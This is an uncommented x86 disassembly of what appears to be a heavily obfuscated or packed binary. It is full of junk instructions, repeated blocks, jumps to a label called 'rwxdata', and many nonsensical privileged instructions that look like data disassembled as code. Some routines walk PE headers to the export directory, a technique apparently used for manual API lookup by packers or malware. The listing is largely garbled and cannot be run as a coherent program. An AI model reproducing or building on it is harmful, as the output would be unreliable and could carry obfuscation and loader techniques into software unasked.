shld di dx cl
dec di
mov edi [ edx + 0x1c ]
stc
pushfd
pushfd
push ebp
add edi eax
bt sp 0x8
mov edi [ edi + ecx * 4 ]
test cx ax
test edi edi
push [ esp + 0x4 ]
pushfd
call sub_10147cf1
xchg esi eax
dec eax
pshufw mm6 [ ebx + 0x120dbdac ] 0x68
mov bh 0x28
cmp ecx [ 0x10ee1c82 ]
mov dl 0xc
sti
in al 0x96
call 0x4bc7564
out dx eax
sar [ edi ] 0x1
add [ edx ] dh
or al 0xd7
call 0x7e82a5e0
jg rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
in al 0xe7
pushad
or [ ebx + 0x2c17ce7a ] 0xffffffab
adc al 0x4c
std
aad 0x0
inc ebp
xor [ ebp + 0x4a ] 0x46d119fa
out dx eax
push ebp
0x33ac1aa5 0xe244
dec edx
pop ebx
0x97843bb1 0xf378
adc ebx [ ecx - 0x196e3144 ]
scasd [ edi ]
adc [ ebx ] ch
sbb al 0x2c
pop ebp
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_10209cc9
lea esp [ esp + 0x2c ]
jae rwxdata
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
movzx edi cl
clc
cmc
shl bx 0xc
mov ebx eax
bswap di
xchg cx di
mov edi eax
push 0x245f579a
inc ch
call sub_102086f2
pop edi
sub esi edx
popad
je rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_10209cf7
push 0xd8ad055f
mov [ esp ] ebx
lea esp [ esp + 0x14 ]
jne rwxdata
push edx
mov [ esp ] 0x73a6
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
jmp rwxdata
not dl
pushf
neg dl
mov dl [ esi ]
pushfd
test ch ah
jmp rwxdata
pushfd
not dl
cmc
sub dl 0x59
jmp rwxdata
neg dl
cmc
pushad
mov [ esp ] ch
sub dl 0x9d
test sp 0x654e
push 0x264e5a83
call sub_1020b79e
push 0x594fb2c
push [ esp ]
call sub_101ffa2f
jmp rwxdata
pushfd
dec eax
pushfd
shl eax 0x8
not al
push 0x3695820c
pushfd
lodsb [ esi ]
push 0xe3e5c175
cmc
not al
cmc
sub al 0x59
push 0x5d658544
pushfd
neg al
pushad
bt sp 0x6
clc
mov [ esp + 0x4 ] 0x1335
sub al 0x9d
push 0x6a86e1a5
jmp rwxdata
lea esp [ esp + 0x48 ]
call sub_1014c55d
push ecx
push 0x686be2cd
cmp eax 0x7d00
lea esp [ esp + 0x8 ]
jge rwxdata
pushad
pushfd
mov [ esp + 0x4 ] 0xe3
lea esp [ esp + 0x24 ]
jae rwxdata
jae rwxdata
pushad
inc ecx
lea esp [ esp + 0x20 ]
push 0xbfe735f8
inc ecx
add esp 0x4
rcl bl cl
cmc
xchg ebp eax
xchg ah bl
clc
sub bl 0xbd
mov eax ebp
pushfd
sbb bl bh
mov bl 0x1
sub esp 0xfffffffc
stc
call sub_101491f0
pushad
call j_sub_1011701f
stosb [ edi ]
enter 0x71ee 0x75
imul edi [ edx + 0x3a ] 0xda6e4938
add eax 0xd185ba99
lea edi [ ecx ]
lds ebp [ ecx - 0x44f02f8a ]
arpl [ eax ] di
inc edi
jmp rwxdata
clc
push 0x496c45e7
jmp sub_10117f5e
sti
inc esp
push ecx
insd
enter 0xa076 0xbe
push edx
insd
push ebp
dec edx
retn
sub_1020a0ba
pushad
mov [ esp + 0x24 ] 0x1b67ca9c
jmp rwxdata
jmp rwxdata
pushfd
mov [ esp + 0x24 ] 0xc3e743ae
pushfd
push [ esp + 0x4 ]
push edi
lea esp [ esp + 0x30 ]
jmp rwxdata
call sub_1020e9c5
pushfd
mov [ esp ] eax
bt si di
rol si cl
xchg bp si
push ebx
movsx bx cl
bswap di
push 0xd9734d72
push [ rwxdata ]
pop [ esp ]
btr edi edi
xchg esi edi
stc
push 0x0
not bl
rcr si cl
rcr ebp 0x1
rcl bp 0xa
mov esi [ esp + 0x30 ]
mov di sp
call sub_1020dd7a
add al 0x22
and [ esi ] bl
add al 0x2
movsd [ edi ] [ esi ]
sbb eax 0x1b60a204
add al 0x2
jb rwxdata
cmp bl [ ebx ]
add al 0x62

add al 0xc2
push edx
sbb al [ edx + eax ]
jb rwxdata
add [ ebx ] ebx
add al 0xe2
push esp
sbb eax 0x1b98a204
add al 0xa2
add al 0x82
jno rwxdata
popad
sbb eax 0x1ba7e204
add al 0x62
sub bl [ esi ]
add al 0x62
xchg edi eax
sbb al [ edx + eax * 4 ]
pop ebp
sbb al [ edx ]
fstp [ esp + eax ]
retn 0x1da2
mov [ 0xffffffffa2041b98 ] al
add al 0xa2
in eax dx
sbb al 0x4
retn 0x1acd
sub_1020a29f
stc
cmp al 0x9
pushfd
mov [ esp + 0x4 ] 0x90407234
lea esp [ esp + 0xc ]
ja rwxdata
push edi
pushad
call sub_10201207
clc
imul edx edx 0xa
bt ebp 0x8
pushfd
add edx eax
pushad
pushfd
lea esp [ esp + 0x28 ]
jmp rwxdata
jmp rwxdata
rcl al 0x3
rcl al cl
clc
add edi 0x1
rol al 0x1
inc al
mov al [ edi ]
cmc
test al al
pushfd
jmp sub_101441d3
sub_1020a4fe
pushad
call j_sub_1020c42d
add eax 0x93722b93
stc
out dx al
dec ebx
xchg edi ebx
pushad
mov eax [ 0x348c95df ]
arpl sp sp
jpe rwxdata
jge rwxdata
jle rwxdata
mov ah 0xcb
cmp bl al
xchg [ edx + 0xf ] esi
adc al 0xc6
or ch 0x92
push esp
mov ah dl
cmp [ edi - 0x778ce48 ] ah
or ebp edx
jbe rwxdata
push esp
cmp esi ebx
imul esp [ eax - 0x18 ] 0xffffff96
in eax 0xff
inc [ 0xffffffff93722b93 ]
jecxz rwxdata
pushfd
jecxz rwxdata
scasb [ edi ]
pop ss
cmpsd [ esi ] [ edi ]
out dx al
rcl [ ecx ] 0x1
and al 0x87
mov [ esi + 0x28 ] edx
xchg esi eax
pop esi
cmpsd [ esi ] [ edi ]
ror [ ebp + ebx * 2 - 0x7479a67f ] cl
xchg ebx eax
jb rwxdata
das
lodsd [ esi ]
adc ecx [ ebx ]
outsd
fsub st3

push esp
add [ edi + 0x13 ] ebp
out dx al
call 0x1b01a750
out dx al
jmp 0xfffffffffe4a6862
std
0xd70678d5 0x4a27
loope rwxdata
mov ebp [ edi ]
std
pop edi
jbe rwxdata
fsubr [ edi - 0x77889f7 ]
or [ edi - 0x340c95d2 ] edx
js rwxdata
xor ah dl
call 0x3ec8d80
cld
inc edi
adc [ 0x2e0b2ced ] 0x902e88bf
adc edi ebp
sub_1020a695
bts esi 0x15
lea esi [ esp + 0x28 ]
pushfd
jmp rwxdata
sub edi 0x4
mov [ esp + 0x4 ] bl
test bh 0x43
push [ edi ]
pop [ esp + 0x28 ]
cmp dh ch
add esp 0x28
ja rwxdata
clc
cmc
clc
cmp edi ebx
call sub_102090e3
pushfd
test edi edi
jmp rwxdata
cmp si 0x6cb2
cmp edi ebx
pushfd
push 0xf9938d36
push [ esp ]
call sub_10145e96
jmp rwxdata
push ecx
lea esp [ esp + 0x34 ]
je rwxdata
movsx dx al
je rwxdata
call sub_1014491d
test [ eax ] bh
cmpsb [ esi ] [ edi ]
push 0xcbbac4b6
movsb [ edi ] cs : [ esi ]
pop esp
xor al 0x14
pushfd
add esi [ edi + 0x7 ]
push ebx
dec ebx
imul edx [ ebx - 0x2a479f22 ] 0x30
inc ecx
lodsb [ esi ]
fwait
push ecx
outsb
shl [ ecx ] 0x1
mov ebx 0x76e9cfde
dec esp
jb rwxdata
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
or edi [ ecx + 0x50a94144 ]
loopne rwxdata
push esi
lea esi [ edx ]
pushad
fbstp [ ebx + ecx * 8 - 0x75 ]
ror edi cl
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
stosb [ edi ]
cwde
xchg ebx ebx
mov [ 0x2211cd1c ] eax
adc al 0x6b
aam 0xdf
fadd [ edx + 0x74 ]
pop ds
dec eax
pop edi
mov [ ebx + 0x3c88b79c ] ah
leave
fiadd [ eax ]
mov ah 0xa8
add [ edx + ebp + 0x65516eb4 ] dl
pop edx
imul edx [ ebx - 0x37 ] 0xffffff96
ja rwxdata
dec esi
xor eax 0x6713cc58
xchg ecx eax
mov [ 0xffffffffe4db88a1 ] al
arpl dx cx
push es
jns rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
jmp 0x3983c645
pop ss
push 0xde80a9f5
and al 0xfb
sbb dh al
cdq
movsd [ edi ] [ esi ]
fcmovb st5
mov ch 0xaa
nop
push esi
enter 0xd3c2 0xcc
imul eax
inc edi
fsubr st1
pop edi
test [ edi ] bl
push ss
xor dh [ eax + 0x690ed055 ]
imul [ eax - 0x17b52b0a ]
push esi
insb
push edx
xchg ecx eax
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
aaa
cwde
push bx
sub ebp [ ebx ]
xor ecx [ eax + 0x57 ]
imul esi [ eax * 2 + 0x5d7e6d11 ] 0x67
outsd
stosd [ edi ]
fwait
test eax 0xf29ec096
lodsb [ esi ]
mov al [ 0xffffffffbe622fc2 ]
popad
jb rwxdata
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata

rwxdata
push cs
imul esi esi 0x4ad4f6a8
call 0xffffffffa163e6cd
mov [ ebx + edx * 4 - 0x5a61954 ] bl
inc ebp
cmp esi [ edx - 0x5a ]
xor eax 0xd0c1f174
inc edx
xchg ebp eax
aas
sbb cl 0x85
xchg esi eax
pop eax
out 0xc7 eax
out dx eax
or [ ebx - 0x52 ] 0xffffffbd
rol [ ecx ] 0x9e
jecxz rwxdata
dec edi
mov dh 0x88
mov dh 0x8f
0xf81fd708 0x9288
test [ edi ] dh
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_1020a973
add eax edi
lea esp [ esp + 0x4 ]
bt dx 0x9
cmp eax edx
pushad
lea esp [ esp + 0x20 ]
jb rwxdata
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
cmp bl 0x56
push ebx
call sub_1011eb7e
add [ eax ] al
push edi
push esp
push ebx
inc esi
jb rwxdata
pop edi
sub esi edx
popad
je rwxdata
0x89a9f514 0xc6b5
dec ebp
insd
outsd
jb rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
xchg edx eax
jne rwxdata
add [ 0xffffffffe0bf3f9f ] bl
loop rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
inc ebp
mov eax [ 0xffffffffc281fd3d ]
in al dx
lodsd [ esi ]
cmp [ edx - 0x671a661c ] 0xe6
daa
push edi
push 0xc3978c23
fcom [ ebx - 0x64 ]
and ebx ebp
inc [ eax - 0x17aca905 ]
0xfff141 0x5700
in eax dx
pushad
pop ds
mov bl 0xac
add al 0x2e
sbb dh [ ebp + 0x29 ]
imul edx esi 0x42dd0ef0
imul ebx [ edx - 0x3d021988 ] 0x74
or bh [ ecx + 0x752a5426 ]
dec edx
pop eax
xchg [ edi ] bh
jg rwxdata
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
popad
fst [ edx ]
xor [ eax ] edx
xlat
mov ebx 0x9d1e0d71
in eax dx
xor eax 0x4c06c5b9
popad
and bl [ ebp - 0x6ac61a67 ]
mov esp 0x7b275797
jge rwxdata
inc [ eax + 0x7f ]
and [ ecx ] dh
iretd
push 0xf409a536
pop edx
les eax [ 0x7b9c93d5 ]
or [ ebx ] ch
sbb ah [ esi - 0x9207809 ]
enter 0x53d9 0x2b
cmp edi 0xffffffdf
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
std
cmp [ ecx + 0x9 ] al
jle rwxdata
sbb si bp
int1
sbb eax 0x5915f001
cmc
test eax 0xbd81b1ad
or eax 0xa145da11
cmp eax 0xf2c281fd
in al dx
mov bh 0x88
mov eax [ 0xcfbc48c ]
in al dx
jmp rwxdata
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
call 0xffffffffab376d8d
mov [ ebx - 0x57 ] edx
insd
push ecx
lea esp [ ecx - 0x23 ]
out dx al
jns rwxdata
jecxz rwxdata
xor [ eax ] ebx
daa
jpo rwxdata
sbb ebp edi
shr [ ecx ] cl
aad 0x16
dec esi
mov dl 0x2a
mov ah 0xf5
or dh [ ecx ]
dec esi
cmpsb [ esi ] [ edi ]
pop edi
dec ebp
xchg edx eax

mov esp es
sti
or al 0xec
salc
sub eax [ edx - 0x12158581 ]
push es
push esp
cmp ecx [ ecx - 0x79 ]
push eax

sub_1020ac2a
pushfd
lea esp [ esp + 0x34 ]
call sub_101ffc63
jmp rwxdata
adc al al
pushfd
mov [ esp ] dl
lea esp [ esp + 0x4 ]
jae rwxdata
pushad
pushfd
push [ esp ]
push edi
lea esp [ esp + 0x2c ]
call sub_101ffc63
call sub_10209cf2
cmp ebx [ edx + 0x45 ]
out dx al
jno rwxdata
push ebx
call j_sub_10116a9b
push 0x1b28e909
pushad
jmp rwxdata
pop eax
mov [ edi ] 0x3f
[ ebx + 0x2e796453 ]
popad
mov [ 0x5da63227 ] al
mov [ esp + 0x40 ] eax
mov [ esp + 0x4 ] dh
push edx
pushfd
pushfd
push [ esp + 0x4c ]
retn 0x50
fmul [ esi ]
jmp rwxdata
cmpsb [ esi ] [ edi ]
pop ebp
stosb [ edi ]
jne rwxdata
mov cl 0xa8
mov dh 0xe8
xchg edi eax
jbe rwxdata
mov dl 0xcc
mov ah 0x1b
sbb ah bl
push ds
cmpsd [ esi ] [ edi ]
insb
les edx [ edi - 0x5ba0f3df ]
fmul [ esi ]
jpe rwxdata
xor [ esi ] cl
pop ds
inc esi
stc
and eax 0x5ecfc5f8
mov [ esi - 0x27849729 ] dl
fxch st5
nop
mov ds [ edi + 0x57e861a1 ]
lodsb [ esi ]
rcr [ ecx + 0x25 ] 0x4c
push edx
inc al
ror ch cl
sbb al 0xc2
dec eax
xchg edi eax
sub_1020ad0d
movzx edi al
neg di
mov edi [ edx + 0x1c ]
pushfd
cmp di sp
pushfd
add edi eax
pushad
cmp cx di
jmp rwxdata
stc
mov edi [ edi + ecx * 4 ]
mov [ esp ] 0x2f
bt dx 0x8
pushfd
test ebx edi
test edi edi
jmp rwxdata
push esp
lea esp [ esp + 0x3c ]
je rwxdata
movsx dx al
je rwxdata
test bl 0x9b
test al al
add eax edi
test dx 0x40b1
jmp rwxdata
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
stc
cmp eax edx
jmp rwxdata
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
pushfd
call j_sub_1014b104
pushfd
jmp rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
lea esp [ esp + 0x1c ]
je rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
push esi
stc
call sub_102000b2
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_1020ae98
lea esp [ esp + 0x4 ]
je rwxdata
movsx dx al
je rwxdata
pushad
mov esi [ eax + 0x3c ]
bsr dx ax
movzx dx al
add esi eax
pushfd
mov edx [ esi + 0x78 ]
bt bx ax
jmp rwxdata
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
test edx edx
jmp rwxdata
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
pushad
push edi
push ebp
lea esp [ esp + 0x4c ]
je rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
inc cx
shld cx dx cl
sub ch 0xae
cmc
add edx eax
shl cx cl
mov ecx [ esi + 0x7c ]
jmp rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
add ecx edx
call sub_10116de4
popad
in al dx
jae rwxdata
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor [ 0xffffffffac3cecfe ] 0xa582f8f2
les ebx [ edx - 0x49568cb4 ]
imul [ ecx + ebx * 2 - 0x336a8abe ]
mov ebx 0x21de4af0
std
dec esp
mov dl 0x14
0xbb17c3fc 0xcec5
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_1020b7b5
test edi edi
jmp rwxdata
pushfd
jmp rwxdata
lea esp [ esp + 0x1c ]
je rwxdata
movsx dx al
je rwxdata
push esi
stc
call sub_102000b2
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
